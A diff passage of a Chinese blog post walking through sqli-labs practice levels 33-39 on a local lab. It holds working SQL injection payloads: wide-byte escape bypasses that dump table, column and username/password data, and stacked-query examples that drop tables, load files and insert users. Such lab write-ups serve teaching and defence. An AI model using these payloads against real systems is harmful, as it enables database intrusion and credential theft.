+<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,database(),3--+ </code></p>
+<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+ </code></p>
+<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3--+ </code></p>
+<p><code>http://localhost:81/sqli-labs-master/Less-33/index.php?id=1%df%5c%27 union select 1,(select group_concat(username,password) from users),3--+</code></p>
+<p>33关<img src="/images/33.png" alt="33"></p>
+<p>34关 只是把注入点从id换成uname,方式从get换成post，还是单引号注入</p>
+<p><img src="/images/34.png" alt="34"></p>
+<p>35关 注入方式把其他的都试了试，发现都不行，所以为数字型，那么所有的转义就形同虚实啦。</p>
+<p>36关 和三十二题一模一样，是源码中实现功能的函数不同的区别</p>
+<p><img src="/images/36.png" alt="36"></p>
+<p>37关 post型，只是把34关中过滤函数改了，方法一样。</p>
+<p><img src="/images/37.png" alt="37"></p>
+<p><img src="/images/37%EF%BC%882%EF%BC%89.png" alt="37（2）"></p>
+<p>总结<br>过滤 ‘ \ 常用的三种方式是直接 replace，<br>addslashes(),mysql_real_escape_string()。三种方式仅仅依靠一个函数是不能完全防御的，所以我们在编写代码的时候需要考虑的更加仔细。下面给出几种防御的方式<br>1、在使用 mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将 mysql 设置为gbk 即可。设置代码：Mysql_set_charset(‘gbk’,’$conn’）<br>2、使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞。</p>
+<p>38关</p>
+<p>注入方式：单引号注入</p>
+<p><img src="/images/38.png" alt="38"></p>
+<p><img src="/images/38%EF%BC%882%EF%BC%89.png" alt="38（2）"></p>
+<p><img src="/images/38%EF%BC%883%EF%BC%89.png" alt="38（3）"></p>
+<p>这题报错注入，联合注入都可以用。</p>
+<p>查看源码</p>
+<p>开始学了新的注入方式，堆叠注入</p>
+<p>进行增删改查等操作，但对于各个数据库（mysql，sqlserver，oracle）等，除oracle不允许外，其他操作可行性同样。</p>
+<p>他与union不同的是注入的前后语句不一定要类型一致。但是不好的一点是他没有判断是否的显示判断。</p>
+<p>select * from users where id=1;create table test like users;  //新建表</p>
+<p>select * from users where id=1;drop table test;  //删除表</p>
+<p>select * from users where id=1;select 1,2,3;   //查询数据</p>
+<p>select * from users where id=1;select load_file(‘c:/tmpupbbn.php’); //加载文件</p>
+<p>select * from users where id=1;insert into users(id,username,password) values (‘100’,’new’,’new’);   //修改文件</p>
+<p>39关</p>
+<p>注入方式是整型，其他与38无异。</p>
+<p><img src="/images/39.png" alt="39"></p>
 
                 
             </div>
@@ -617,7 +560,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/12/03/lesson26-28/">http://example.com/2021/12/03/lesson26-28/</a>
+                    <a href="http://example.com/2021/12/10/lesson29-39/">http://example.com/2021/12/10/lesson29-39/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -654,7 +597,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
+                            
+                                <a href="/tags/sqli%E9%9D%B6%E5%9C%BA/">
+                                    <span class="chip bg-color">sqli靶场</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -828,13 +775,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2021/12/10/lesson29-39/">
+                <a href="/2021/12/11/Lesson40-45/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="lesson29-39">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Lesson40-45">
                         
-                        <span class="card-title">lesson29-39</span>
+                        <span class="card-title">Lesson40-45</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -845,7 +792,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-10
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-12-11
                         </span>
                         <span class="publish-author">
                             
@@ -873,13 +820,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/12/01/lesson23-25/">
+                <a href="/2021/12/03/lesson26-28/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="lesson23-25">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="lesson26-28">
                         
-                        <span class="card-title">lesson23-25</span>
+                        <span class="card-title">lesson26-28</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -890,7 +837,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-01
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-12-03
                             </span>
                         <span class="publish-author">
                             
@@ -899,14 +846,6 @@
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/sqli%E9%9D%B6%E5%9C%BA/">
-                        <span class="chip bg-color">sqli靶场</span>
-                    </a>
-                    
                 </div>
                 
             </div>
